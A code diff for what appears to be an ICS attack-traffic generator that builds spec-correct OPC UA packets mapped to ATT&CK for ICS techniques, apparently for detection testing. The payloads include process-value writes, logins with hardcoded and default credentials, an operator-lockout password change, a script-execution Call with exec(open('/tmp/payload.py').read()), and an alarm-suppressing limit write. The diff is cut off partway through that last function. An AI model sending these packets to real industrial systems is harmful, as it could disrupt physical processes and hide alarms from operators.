@@ -3,22 +3,24 @@
 import random
 import struct
 
-from .common import marker_bytes
+from .common import marker_bytes  # noqa: F401
+from .covert_marker import covert_u32, explicit_marker
 
 # OPC UA Service node IDs (numeric)
 SVC = {
     "GetEndpoints":        428,   # discovery
-    "FindServers":         420,
+    "FindServers":         422,
+    "OpenSecureChannel":   446,   # T0834 Native API (raw secure channel)
     "Browse":              527,   # T0861 Point & Tag Identification
     "BrowseNext":          533,
     "Read":                631,   # T0801 Monitor Process State
     "Write":               673,   # T0831/T0836/T0855
-    "Call":                710,   # T0871 Execution through API
+    "Call":                712,   # T0871 Execution through API
     "CreateSession":       461,   # T0822 External Remote Services
     "ActivateSession":     467,   # T0859 Valid Accounts
     "CloseSession":        473,   # T0826 connection cleanup
     "CreateSubscription":  787,   # T0802 Automated Collection
-    "Publish":             823,   # T0801 polling
+    "Publish":             826,   # T0801 polling
     "HistoryRead":         664,   # T0879 Data Historian Compromise
     "DeleteSubscriptions": 847,   # T0815 Denial of View (kill subscription)
     "TranslateBrowsePaths":554,   # T0861 path-based tag discovery
@@ -40,25 +42,57 @@ def _opc_header(msg_type: bytes, chunk: bytes = b"F", body: bytes = b"") -> byte
 
 
 def _node_id(svc_id: int) -> bytes:
-    """Encode a numeric NodeId for service request (4-byte encoding)."""
-    # NodeId encoding type 0x01 = two-byte numeric, 0x02 = four-byte
+    """Encode a numeric NodeId for an OPC UA service request (Part 6 §5.2.2.9).
+
+    Encoding byte selects the format:
+      0x00 TwoByteNodeId  : [0x00][identifier u8]                 (ns 0, id<=255)
+      0x01 FourByteNodeId : [0x01][namespace u8][identifier u16]  (id<=65535)
+      0x02 NumericNodeId  : [0x02][namespace u16][identifier u32]
+
+    Standard service request types live in namespace 0, so ids >255 (e.g.
+    WriteRequest=673, ReadRequest=631) use FourByteNodeId. This is the
+    dissector-correct encoding: the service id reads back exactly.
+    """
     if svc_id <= 0xFF:
-        return struct.pack("<BH", 0x01, svc_id)
+        return struct.pack("<BB", 0x00, svc_id)
+    elif svc_id <= 0xFFFF:
+        return struct.pack("<BBH", 0x01, 0x00, svc_id)
     else:
-        return struct.pack("<BI", 0x02, svc_id)
+        return struct.pack("<BHI", 0x02, 0x0000, svc_id)
+
+
+def _nid4(numeric: int) -> bytes:
+    """FourByteNodeId for a namespace-0 numeric id used inside service bodies
+    (browse roots, node ids to read/write, method/object ids). 4 bytes:
+    [0x01][ns=0 u8][identifier u16]. Ids are masked to 16 bits."""
+    return struct.pack("<BBH", 0x01, 0x00, numeric & 0xFFFF)
 
 
 def _request_header(req_handle: int = 1) -> bytes:
-    """Minimal OPC UA RequestHeader (timestamp + handle + diag + audit)."""
+    """OPC UA RequestHeader (Part 4 §7.28), spec-correct 29-byte layout:
+
+        authenticationToken : NodeId           (null session token = 0x00 0x00)
+        timestamp           : DateTime  Int64
+        requestHandle       : UInt32           (covert carrier)
+        returnDiagnostics   : UInt32
+        auditEntryId        : String           (null = 0xFFFFFFFF)
+        timeoutHint         : UInt32
+        additionalHeader    : ExtensionObject  (null: NodeId 0x0000 + encoding 0x00)
+
+    Total = 2 + 8 + 4 + 4 + 4 + 4 + 3 = 29 bytes. (The earlier version omitted
+    the authenticationToken and used a 1-byte timeoutHint, leaving requestHandle
+    and every following service field misaligned.)
+    """
     timestamp = 132_800_000_000_000_000  # arbitrary DateTime
-    return struct.pack("<qIIIBI",
-        timestamp,
-        req_handle,  # requestHandle
-        0,           # returnDiagnostics
-        0,           # auditEntryId (null string = 0xFFFFFFFF)
-        0,           # timeoutHint = 0
-        0xFFFFFFFF,  # additionalHeader (null extension object)
-    )[:28]  # fixed 28 bytes for simplified header
+    return (
+        b"\x00\x00"                       # authenticationToken: null TwoByteNodeId
+        + struct.pack("<q", timestamp)    # timestamp (Int64)
+        + struct.pack("<I", req_handle)   # requestHandle (UInt32) — covert carrier
+        + struct.pack("<I", 0)            # returnDiagnostics
+        + struct.pack("<I", 0xFFFFFFFF)   # auditEntryId (null String)
+        + struct.pack("<I", 0)            # timeoutHint
+        + b"\x00\x00\x00"                 # additionalHeader: null ExtensionObject
+    )
 
 
 
@@ -108,7 +142,19 @@ def build_payload(marker: str, style: str = "hello", **kwargs) -> bytes:
     token   = int(kwargs.get("security_token",    rnd.randint(1, 0xFFFFFF)))
     seq     = int(kwargs.get("sequence_number",   rnd.randint(1, 0xFFFFFF)))
     req_id  = int(kwargs.get("request_id",        rnd.randint(1, 0xFFFF)))
-    mb      = marker_bytes(marker)
+    _mode = kwargs.get("marker_mode", "covert" if marker else "none")
+    _run = kwargs.get("run_marker", "offline")
+    _idx = int(kwargs.get("pkt_index", 0))
+    # OPC UA RequestHandle is a 32-bit client-chosen correlation token the
+    # server echoes back — a natural covert carrier. In covert mode every
+    # RequestHeader uses the keyed handle (zero added bytes).
+    _covert_handle = covert_u32(_run, "opcua", _idx) if (_mode == "covert" and marker) else None
+    # Explicit mode appends the compact 13-byte tag; covert/none append nothing.
+    mb = explicit_marker(_run, "opcua") if (_mode == "explicit" and marker) else b""
+
+    def _req_hdr(req_handle: int = 1) -> bytes:
+        """Local RequestHeader that injects the covert handle in covert mode."""
+        return _request_header(_covert_handle if _covert_handle is not None else req_handle)
 
     def _sym_header() -> bytes:
         """Symmetric security header (no security)."""
@@ -119,7 +165,7 @@ def build_payload(marker: str, style: str = "hello", **kwargs) -> bytes:
         return struct.pack("<II", seq, req_id)
 
     def _msg_body(svc_id: int, svc_payload: bytes = b"") -> bytes:
-        return _sym_header() + _seq_header() + _node_id(svc_id) + _request_header() + svc_payload
+        return _sym_header() + _seq_header() + _node_id(svc_id) + _req_hdr() + svc_payload
 
     if style == "hello":
         dst = kwargs.get("dst_ip", "10.0.0.1")
@@ -131,95 +177,157 @@ def build_payload(marker: str, style: str = "hello", **kwargs) -> bytes:
         return _opc_header(MSG_HEL, b"F", body)
 
     elif style == "get_endpoints":
+        # GetEndpointsRequest := endpointUrl(String) + localeIds[] (String array)
+        # + profileUris[] (String array). Empty arrays = count 0.
         dst    = kwargs.get("dst_ip", "10.0.0.1")
         ep_url = kwargs.get("endpoint", f"opc.tcp://{dst}:4840").encode()
-        payload = struct.pack("<I", len(ep_url)) + ep_url + mb
+        payload = (struct.pack("<I", len(ep_url)) + ep_url
+                   + struct.pack("<I", 0)    # localeIds = empty array
+                   + struct.pack("<I", 0)    # profileUris = empty array
+                   + mb)
         body    = _msg_body(SVC["GetEndpoints"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "find_servers":
+        # FindServersRequest := endpointUrl(String) + localeIds[] + serverUris[].
         ep_url  = kwargs.get("endpoint", "opc.tcp://10.0.0.1:4840").encode()
-        payload = struct.pack("<I", len(ep_url)) + ep_url + mb
+        payload = (struct.pack("<I", len(ep_url)) + ep_url
+                   + struct.pack("<I", 0)    # localeIds = empty array
+                   + struct.pack("<I", 0)    # serverUris = empty array
+                   + mb)
         body    = _msg_body(SVC["FindServers"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "open_session":
-        # OPN (OpenSecureChannel) message layout per OPC UA spec Part 6 §7.1.2:
-        #   MessageHeader(8)                     ← emitted by _opc_header
-        #   SecureChannelId(4)                   ← 0xFFFFFFFF = new channel
+        # OPN (OpenSecureChannel) message, OPC UA Part 6 §7.1.2 / §5.5.2.
+        # An OPN carries an OpenSecureChannelRequest (service 446), NOT a
+        # CreateSession — CreateSession travels in a MSG after the channel is
+        # open. Layout:
+        #   MessageHeader(8)                       ← _opc_header
+        #   SecureChannelId(4) = 0 (new channel)
         #   AsymmetricAlgorithmSecurityHeader:
-        #     SecurityPolicyUri.Length(4) = -1   ← null string (no security)
-        #     SenderCertificate.Length(4)  = -1  ← null ByteString
-        #     RecvCertThumbprint.Length(4) = -1  ← null ByteString
-        #   SequenceHeader(8): seq(4) + reqId(4)
-        #   Service payload: OpenSecureChannelRequest encoded
-        # Historical bug: we emitted SecureChannelId AFTER asym_hdr and also
-        # packed two stray zero uint32s, which produced a malformed frame
-        # that Wireshark's OPC UA dissector flagged at the ReceiverCert
-        # thumbprint field. Now fixed to spec order.
-        ep_url    = kwargs.get("endpoint", "opc.tcp://10.0.0.1:4840").encode()
-        sess_name = b"ICSForge-Session"
-        nonce     = bytes([rnd.randint(0, 255) for _ in range(32)])
-        svc_payload = _node_id(SVC["CreateSession"]) + _request_header() + \
-                      struct.pack("<I", len(ep_url)) + ep_url + \
-                      struct.pack("<I", len(sess_name)) + sess_name + \
-                      struct.pack("<I", len(nonce)) + nonce + mb
-        # OPN-specific body: sc_id + asym_hdr(nulls) + seq_header + service payload
-        opn_body = (
-            struct.pack("<I", 0xFFFFFFFF) +                  # SecureChannelId = new
-            struct.pack("<III", 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF) +  # null asym_hdr
-            _seq_header() +
-            svc_payload
-        )
+        #     securityPolicyUri (String) = "...#None"
+        #     senderCertificate (ByteString) = null (-1)
+        #     receiverCertificateThumbprint (ByteString) = null (-1)
+        #   SequenceHeader(8)
+        #   OpenSecureChannelRequest:
+        #     requestHeader(29) + clientProtocolVersion(u32)
+        #     + securityTokenRequestType(enum u32: 0=ISSUE)
+        #     + messageSecurityMode(enum u32: 1=NONE)
+        #     + clientNonce(ByteString, null) + requestedLifetime(u32)
+        policy_uri = b"http://opcfoundation.org/UA/SecurityPolicy#None"
+        asym_hdr = (struct.pack("<I", len(policy_uri)) + policy_uri
+                    + struct.pack("<I", 0xFFFFFFFF)        # senderCertificate = null
+                    + struct.pack("<I", 0xFFFFFFFF))       # receiverCertThumbprint = null
+        oscr = (_node_id(SVC["OpenSecureChannel"]) + _req_hdr()
+                + struct.pack("<I", 0)                     # clientProtocolVersion
+                + struct.pack("<I", 0)                     # securityTokenRequestType = ISSUE
+                + struct.pack("<I", 1)                     # messageSecurityMode = NONE
+                + struct.pack("<I", 0xFFFFFFFF)            # clientNonce = null ByteString
+                + struct.pack("<I", 3600000)               # requestedLifetime (ms)
+                + mb)
+        opn_body = struct.pack("<I", 0) + asym_hdr + _seq_header() + oscr
         return _opc_header(MSG_OPN, b"F", opn_body)
 
     elif style == "activate_session":
-        # ActivateSession — credential presentation (T0859)
-        # Anonymous identity token
-        token_data = struct.pack("<I", 0)  # null policy id
-        payload    = token_data + mb
+        # ActivateSessionRequest — credential presentation (T0859). Body:
+        #   clientSignature(SignatureData: algorithm String null + signature
+        #   ByteString null) + clientSoftwareCertificates[] (empty) + localeIds[]
+        #   (empty) + userIdentityToken(ExtensionObject) + userTokenSignature
+        #   (SignatureData null). userIdentityToken = AnonymousIdentityToken
+        #   wrapped: typeId nodeId(321=AnonymousIdentityToken_Encoding) +
+        #   encoding(0x01 ByteString body) + body{policyId String}.
+        client_sig = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)  # null alg + null sig
+        anon_body  = struct.pack("<I", 4) + b"anon"     # policyId String "anon"
+        user_token = (_nid4(321)                         # AnonymousIdentityToken_Encoding_DefaultBinary
+                      + struct.pack("<B", 0x01)          # encoding mask: ByteString body present
+                      + struct.pack("<I", len(anon_body)) + anon_body)
+        user_sig   = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)  # null alg + null sig
+        payload    = (client_sig
+                      + struct.pack("<I", 0)             # clientSoftwareCertificates = empty
+                      + struct.pack("<I", 0)             # localeIds = empty
+                      + user_token
+                      + user_sig
+                      + mb)
         body       = _msg_body(SVC["ActivateSession"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "close_session":
+        # CloseSessionRequest := deleteSubscriptions(bool).
         body = _opc_header(MSG_CLO, b"F", _sym_header() + _seq_header() +
-                           _node_id(SVC["CloseSession"]) + _request_header() + mb)
+                           _node_id(SVC["CloseSession"]) + _req_hdr() +
+                           struct.pack("<B", 1) + mb)  # deleteSubscriptions = true
         return body
 
     elif style == "browse":
-        # BrowseRequest with root node (Objects folder = ns=0;i=85)
-        root_node = struct.pack("<BBI", 0x01, 0, 85)  # NodeId
-        browse_desc = root_node + struct.pack("<IB", 0, 0xFF)  # browseDirection=Forward, nodeClass=all
-        payload = struct.pack("<I", len(browse_desc)) + browse_desc + mb
+        # BrowseRequest with root node (Objects folder = ns=0;i=85).
+        # BrowseDescription := nodeId + browseDirection(u32) + referenceTypeId
+        # (NodeId) + includeSubtypes(bool) + nodeClassMask(u32) + resultMask(u32).
+        # We keep a compact-but-valid description: root + direction + null refType
+        # + includeSubtypes + nodeClassMask(all) + resultMask.
+        root_node = _nid4(85)
+        browse_desc = (root_node
+                       + struct.pack("<I", 0)        # browseDirection = Forward
+                       + b"\x00\x00"                 # referenceTypeId = null TwoByteNodeId
+                       + struct.pack("<B", 1)        # includeSubtypes = true
+                       + struct.pack("<I", 0xFF)     # nodeClassMask = all
+                       + struct.pack("<I", 0x3F))    # resultMask = all
+        # BrowseRequest := view(ViewDescription) + requestedMaxRefs(u32)
+        #                  + nodesToBrowse[] (array). view = null.
+        view = b"\x00\x00" + struct.pack("<q", 0) + struct.pack("<I", 0)  # null viewId + ts + viewVersion
+        payload = view + struct.pack("<I", 1000) + struct.pack("<I", 1) + browse_desc + mb
         body    = _msg_body(SVC["Browse"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "browse_next":
-        # BrowseNextRequest — continuation browsing (T0861)
+        # BrowseNextRequest := releaseContinuationPoints(bool)
+        #                      + continuationPoints[] (ByteString array).
         cont_point = bytes([rnd.randint(0, 255) for _ in range(20)])
-        payload = struct.pack("<B", 0) + struct.pack("<I", len(cont_point)) + cont_point + mb
+        payload = (struct.pack("<B", 0)            # releaseContinuationPoints = false
+                   + struct.pack("<I", 1)          # continuationPoints array count = 1
+                   + struct.pack("<I", len(cont_point)) + cont_point
+                   + mb)
         body    = _msg_body(SVC["BrowseNext"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "translate_paths":
-        # TranslateBrowsePathsToNodeIds — tag path discovery (T0861)
-        path_str = kwargs.get("path", "/0:Objects/2:PLCProgram").encode()
-        payload  = struct.pack("<I", len(path_str)) + path_str + mb
+        # TranslateBrowsePathsToNodeIdsRequest := browsePaths[] of BrowsePath.
+        # BrowsePath := startingNode(NodeId) + relativePath(RelativePath).
+        # RelativePath := elements[] of RelativePathElement{ referenceTypeId
+        # (NodeId) + isInverse(bool) + includeSubtypes(bool) + targetName
+        # (QualifiedName: nsIndex u16 + name String) }.
+        target = kwargs.get("path", "PLCProgram").encode()
+        rel_elem = (b"\x00\x00"                       # referenceTypeId = null
+                    + struct.pack("<B", 0)            # isInverse = false
+                    + struct.pack("<B", 1)            # includeSubtypes = true
+                    + struct.pack("<H", 2)            # targetName nsIndex = 2
+                    + struct.pack("<I", len(target)) + target)
+        rel_path = struct.pack("<I", 1) + rel_elem    # elements array count = 1
+        browse_path = _nid4(85) + rel_path            # startingNode = Objects folder
+        payload  = struct.pack("<I", 1) + browse_path + mb   # browsePaths count = 1
         body     = _msg_body(SVC["TranslateBrowsePaths"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "read_value":
-        # ReadRequest — T0801 Monitor Process State
-        # ReadValueId: nodeId + attributeId(Value=13)
-        node_id = struct.pack("<BBI", 0x01, 0, _parse_node_numeric(kwargs.get("node_id"), rnd.randint(1000, 9999)))
-        attr_id = struct.pack("<I", 13)  # Value attribute
-        payload = struct.pack("<I", 1) + node_id + attr_id + mb  # count=1
+        # ReadRequest — T0801 Monitor Process State. Body:
+        #   maxAge(Double) + timestampsToReturn(u32) + nodesToRead[] (ReadValueId
+        #   array). ReadValueId := nodeId + attributeId(u32) + indexRange(String,
+        #   null) + dataEncoding(QualifiedName, null = nsIndex u16 + null String).
+        node_id = _nid4(_parse_node_numeric(kwargs.get("node_id"), rnd.randint(1000, 9999)))
+        rvid = (node_id
+                + struct.pack("<I", 13)            # attributeId = Value
+                + struct.pack("<I", 0xFFFFFFFF)    # indexRange = null String
+                + struct.pack("<H", 0) + struct.pack("<I", 0xFFFFFFFF))  # dataEncoding = null QualifiedName
+        payload = (struct.pack("<d", 0.0)          # maxAge
+                   + struct.pack("<I", 0)          # timestampsToReturn = Source
+                   + struct.pack("<I", 1)          # nodesToRead array count = 1
+                   + rvid + mb)
         body    = _msg_body(SVC["Read"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "read_history":
         # HistoryReadRequest — T0879 Data Historian Compromise
-        node_id  = struct.pack("<BBI", 0x01, 0, _parse_node_numeric(kwargs.get("node_id"), rnd.randint(1000, 9999)))
+        node_id  = _nid4(_parse_node_numeric(kwargs.get("node_id"), rnd.randint(1000, 9999)))
         # HistoryReadDetails: ReadRawModifiedDetails (start/end time)
         start_ts = struct.pack("<q", 132_700_000_000_000_000)
         end_ts   = struct.pack("<q", 132_800_000_000_000_000)
@@ -228,34 +336,51 @@ def build_payload(marker: str, style: str = "hello", **kwargs) -> bytes:
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "write_value":
-        # WriteRequest — T0831/T0836/T0855
-        node_id  = struct.pack("<BBI", 0x01, 0, _parse_node_numeric(kwargs.get("node_id"), rnd.randint(1000, 9999)))
-        attr_id  = struct.pack("<I", 13)  # Value
-        value    = struct.pack("<f", float(kwargs.get("value", rnd.uniform(0.0, 100.0))))
-        payload  = struct.pack("<I", 1) + node_id + attr_id + value + mb
+        # WriteRequest — T0831/T0836/T0855. nodesToWrite[] of WriteValue:
+        #   WriteValue := nodeId + attributeId(u32) + indexRange(String,null)
+        #                 + value(DataValue). DataValue := encodingMask(Byte)
+        #                 [+ Variant]. Variant for Float = builtin id 0x0A + f32.
+        node_id  = _nid4(_parse_node_numeric(kwargs.get("node_id"), rnd.randint(1000, 9999)))
+        variant  = struct.pack("<B", 0x0A) + struct.pack("<f", float(kwargs.get("value", rnd.uniform(0.0, 100.0))))
+        data_val = struct.pack("<B", 0x01) + variant  # DataValue: value present
+        write_value = (node_id
+                       + struct.pack("<I", 13)           # attributeId = Value
+                       + struct.pack("<I", 0xFFFFFFFF)   # indexRange = null String
+                       + data_val)
+        payload  = struct.pack("<I", 1) + write_value + mb   # nodesToWrite count = 1
         body     = _msg_body(SVC["Write"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "call_method":
-        # CallRequest — T0871 Execution through API
-        obj_id   = struct.pack("<BBI", 0x01, 0, _parse_node_numeric(kwargs.get("object_id"), 85))
-        meth_id  = struct.pack("<BBI", 0x01, 0, _parse_node_numeric(kwargs.get("method_id"), rnd.randint(1000, 9999)))
-        payload  = struct.pack("<I", 1) + obj_id + meth_id + mb
+        # CallRequest — T0871 Execution through API. methodsToCall[] of
+        # CallMethodRequest := objectId + methodId + inputArguments[] (Variant
+        # array; empty = count 0).
+        obj_id   = _nid4(_parse_node_numeric(kwargs.get("object_id"), 85))
+        meth_id  = _nid4(_parse_node_numeric(kwargs.get("method_id"), rnd.randint(1000, 9999)))
+        call_req = obj_id + meth_id + struct.pack("<I", 0)  # inputArguments = empty array
+        payload  = struct.pack("<I", 1) + call_req + mb     # methodsToCall count = 1
         body     = _msg_body(SVC["Call"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "create_sub":
-        # CreateSubscriptionRequest — T0802 Automated Collection
-        interval  = struct.pack("<d", float(kwargs.get("interval_ms", 500.0)))
-        lifetime  = struct.pack("<I", 10000)
-        max_keep  = struct.pack("<I", 10)
-        payload   = interval + lifetime + max_keep + mb
+        # CreateSubscriptionRequest := requestedPublishingInterval(Double)
+        #   + requestedLifetimeCount(u32) + requestedMaxKeepAliveCount(u32)
+        #   + maxNotificationsPerPublish(u32) + publishingEnabled(bool)
+        #   + priority(Byte).
+        payload   = (struct.pack("<d", float(kwargs.get("interval_ms", 500.0)))
+                     + struct.pack("<I", 10000)   # lifetimeCount
+                     + struct.pack("<I", 10)      # maxKeepAliveCount
+                     + struct.pack("<I", 0)       # maxNotificationsPerPublish
+                     + struct.pack("<B", 1)       # publishingEnabled = true
+                     + struct.pack("<B", 0)       # priority
+                     + mb)
         body      = _msg_body(SVC["CreateSubscription"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "publish":
-        # Publish — T0801 subscription data poll
-        payload = mb
+        # PublishRequest := subscriptionAcknowledgements[] (array of
+        # SubscriptionAcknowledgement). Empty = count 0.
+        payload = struct.pack("<I", 0) + mb   # empty acknowledgements array
         body    = _msg_body(SVC["Publish"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
@@ -267,61 +392,104 @@ def build_payload(marker: str, style: str = "hello", **kwargs) -> bytes:
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "history_read":
-        # HistoryReadRequest — T0811 Data from Information Repositories
-        # Reads historical process data from OPC UA historian
-        node_id  = struct.pack("<BH", 0x01, rnd.randint(1000, 9999))  # numeric node
-        payload  = node_id + struct.pack("<I", 10) + mb  # read 10 historical values
+        # HistoryReadRequest — T0811 Data from Information Repositories.
+        # Same structure as read_history: ReadRawModifiedDetails (start/end ts)
+        # + a nodesToRead-style node reference.
+        node_id  = _nid4(rnd.randint(1000, 9999))
+        start_ts = struct.pack("<q", 132_700_000_000_000_000)
+        end_ts   = struct.pack("<q", 132_800_000_000_000_000)
+        payload  = start_ts + end_ts + struct.pack("<I", 10) + node_id + mb
         body     = _msg_body(SVC["HistoryRead"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "activate_default":
-        # ActivateSessionRequest with vendor default credentials — T0812 Default Credentials
-        # Many OPC UA servers default to anonymous or guest/guest
-        identity = b"anonymous\x00"  # anonymous identity token
-        payload  = struct.pack("<I", len(identity)) + identity + mb
-        body     = _msg_body(SVC["ActivateSession"], payload)
+        # ActivateSessionRequest with vendor default (anonymous) credentials —
+        # T0812 Default Credentials. Valid ActivateSession body with an
+        # AnonymousIdentityToken carrying policyId "anonymous".
+        client_sig = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)
+        anon_body  = struct.pack("<I", 9) + b"anonymous"
+        user_token = _nid4(321) + struct.pack("<B", 0x01) + struct.pack("<I", len(anon_body)) + anon_body
+        user_sig   = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)
+        payload    = (client_sig + struct.pack("<I", 0) + struct.pack("<I", 0)
+                      + user_token + user_sig + mb)
+        body       = _msg_body(SVC["ActivateSession"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "activate_hardcoded":
-        # ActivateSessionRequest with known hardcoded vendor credential — T0891 Hardcoded Credentials
-        # e.g. "opcua_admin" with empty password — shipped in Kepware, ICONICS
-        user    = b"opcua_admin"
-        passwd  = b""
-        payload = struct.pack("<I", len(user)) + user + struct.pack("<I", len(passwd)) + passwd + mb
+        # ActivateSessionRequest with a known hardcoded vendor credential —
+        # T0891 Hardcoded Credentials (e.g. "opcua_admin" + empty password,
+        # shipped in some Kepware/ICONICS builds). UserNameIdentityToken in an
+        # ExtensionObject (typeId 324 = UserNameIdentityToken_Encoding):
+        #   body{ policyId String + userName String + password ByteString
+        #         + encryptionAlgorithm String }.
+        client_sig = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)
+        user = b"opcua_admin"
+        passwd = b""
+        tok_body = (struct.pack("<I", 8) + b"username"        # policyId
+                    + struct.pack("<I", len(user)) + user      # userName
+                    + struct.pack("<I", len(passwd)) + passwd   # password ByteString
+                    + struct.pack("<I", 0xFFFFFFFF))            # encryptionAlgorithm = null
+        user_token = _nid4(324) + struct.pack("<B", 0x01) + struct.pack("<I", len(tok_body)) + tok_body
+        user_sig   = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)
+        payload    = (client_sig + struct.pack("<I", 0) + struct.pack("<I", 0)
+                      + user_token + user_sig + mb)
         body    = _msg_body(SVC["ActivateSession"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "call_script":
-        # CallRequest with script argument — T0853 Scripting
-        # OPC UA method call with VBScript/Python argument in method params
-        method  = struct.pack("<BH", 0x01, rnd.randint(100, 200))
+        # CallRequest with a script argument — T0853 Scripting. CallMethodRequest
+        # := objectId + methodId + inputArguments[] (Variant array). One String
+        # Variant (builtin id 0x0C) carrying the script.
+        obj_id  = _nid4(85)
+        meth_id = _nid4(rnd.randint(100, 200))
         script  = b"exec(open('/tmp/payload.py').read())"
-        payload = method + struct.pack("<I", len(script)) + script + mb
+        arg     = struct.pack("<B", 0x0C) + struct.pack("<I", len(script)) + script  # String Variant
+        call_req = obj_id + meth_id + struct.pack("<I", 1) + arg   # inputArguments count = 1
+        payload = struct.pack("<I", 1) + call_req + mb             # methodsToCall count = 1
         body    = _msg_body(SVC["Call"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "file_read":
-        # ReadRequest targeting file-type node — T0893 Data from Local System
-        # OPC UA file nodes (FileType, UA Part 5) expose local filesystem
-        node_id = struct.pack("<BH", 0x01, rnd.randint(5000, 6000))
-        payload = node_id + struct.pack("<HH", 13, 0) + mb  # AttributeId 13 = Value
+        # ReadRequest targeting a file-type node — T0893 Data from Local System.
+        # OPC UA FileType nodes (UA Part 5) expose local files. Same ReadRequest
+        # structure as read_value: maxAge + timestampsToReturn + ReadValueId[].
+        node_id = _nid4(rnd.randint(5000, 6000))
+        rvid = (node_id + struct.pack("<I", 13)            # attributeId = Value
+                + struct.pack("<I", 0xFFFFFFFF)            # indexRange = null
+                + struct.pack("<H", 0) + struct.pack("<I", 0xFFFFFFFF))  # dataEncoding = null
+        payload = (struct.pack("<d", 0.0) + struct.pack("<I", 0)
+                   + struct.pack("<I", 1) + rvid + mb)
         body    = _msg_body(SVC["Read"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "change_password":
-        # ActivateSession with new credential (password change) — T0892 Change Credential
-        user    = b"admin"
-        passwd  = b"ICSFORGE_LOCKED"  # new password locking out operators
-        payload = struct.pack("<I", len(user)) + user + struct.pack("<I", len(passwd)) + passwd + mb
+        # ActivateSession presenting a new credential (password change that
+        # locks out operators) — T0892 Change Credential. UserNameIdentityToken
+        # (typeId 324) carrying the attacker's new password.
+        client_sig = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)
+        user = b"admin"
+        passwd = b"ICSFORGE_LOCKED"
+        tok_body = (struct.pack("<I", 8) + b"username"
+                    + struct.pack("<I", len(user)) + user
+                    + struct.pack("<I", len(passwd)) + passwd
+                    + struct.pack("<I", 0xFFFFFFFF))
+        user_token = _nid4(324) + struct.pack("<B", 0x01) + struct.pack("<I", len(tok_body)) + tok_body
+        user_sig   = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)
+        payload = (client_sig + struct.pack("<I", 0) + struct.pack("<I", 0)
+                   + user_token + user_sig + mb)
         body    = _msg_body(SVC["ActivateSession"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "write_large_blob":
-        # WriteRequest with large binary value — T0867 Lateral Tool Transfer
-        # Encodes tool payload inside OPC UA byte-string write to file node
+        # WriteRequest with a large binary value — T0867 Lateral Tool Transfer.
+        # Encodes a tool payload inside a ByteString Variant (builtin id 0x0F)
+        # written to a file node.
         blob    = bytes([rnd.randint(0x20, 0x7E) for _ in range(200)])
-        node_id = struct.pack("<BH", 0x01, rnd.randint(5000, 6000))
-        payload = node_id + struct.pack("<I", len(blob)) + blob + mb
+        node_id = _nid4(rnd.randint(5000, 6000))
+        variant = struct.pack("<B", 0x0F) + struct.pack("<I", len(blob)) + blob
+        data_val = struct.pack("<B", 0x01) + variant
+        wv = node_id + struct.pack("<I", 13) + struct.pack("<I", 0xFFFFFFFF) + data_val
+        payload = struct.pack("<I", 1) + wv + mb
         body    = _msg_body(SVC["Write"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
@@ -334,46 +502,78 @@ def build_payload(marker: str, style: str = "hello", **kwargs) -> bytes:
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "relay_session":
-        # CreateSession to intermediate proxy node — T0884 Connection Proxy
-        # Observable as session creation from an unexpected relay IP
-        endpoint_url = b"opc.tcp://relay.internal:4840"
-        payload      = struct.pack("<I", len(endpoint_url)) + endpoint_url + mb
-        body         = _msg_body(SVC["CreateSession"], payload)
-        return _opc_header(MSG_OPN, b"F", body)
+        # OpenSecureChannel via an intermediate proxy — T0884 Connection Proxy.
+        # OPN carries an OpenSecureChannelRequest (see open_session); the proxy
+        # intent is reflected in the relayed endpoint/policy, not a CreateSession
+        # (which would travel in a later MSG).
+        policy_uri = b"http://opcfoundation.org/UA/SecurityPolicy#None"
+        asym_hdr = (struct.pack("<I", len(policy_uri)) + policy_uri
+                    + struct.pack("<I", 0xFFFFFFFF)
+                    + struct.pack("<I", 0xFFFFFFFF))
+        oscr = (_node_id(SVC["OpenSecureChannel"]) + _req_hdr()
+                + struct.pack("<I", 0)            # clientProtocolVersion
+                + struct.pack("<I", 0)            # securityTokenRequestType = ISSUE
+                + struct.pack("<I", 1)            # messageSecurityMode = NONE
+                + struct.pack("<I", 0xFFFFFFFF)   # clientNonce = null
+                + struct.pack("<I", 3600000)      # requestedLifetime
+                + mb)
+        opn_body = struct.pack("<I", 0) + asym_hdr + _seq_header() + oscr
+        return _opc_header(MSG_OPN, b"F", opn_body)
 
     elif style == "write_alarm_node":
-        # WriteRequest to known alarm limit node — T0838 Modify Alarm Settings
-        # Writes extreme value to HighHighLimit node (standard alarm UA node)
-        import struct as _s
-        node_id = struct.pack("<BH", 0x01, rnd.randint(2000, 3000))
-        value   = _s.pack("<d", 1.0e38)  # IEEE 754 near-infinity = alarm never fires
-        payload = node_id + struct.pack("<I", len(value)) + value + mb
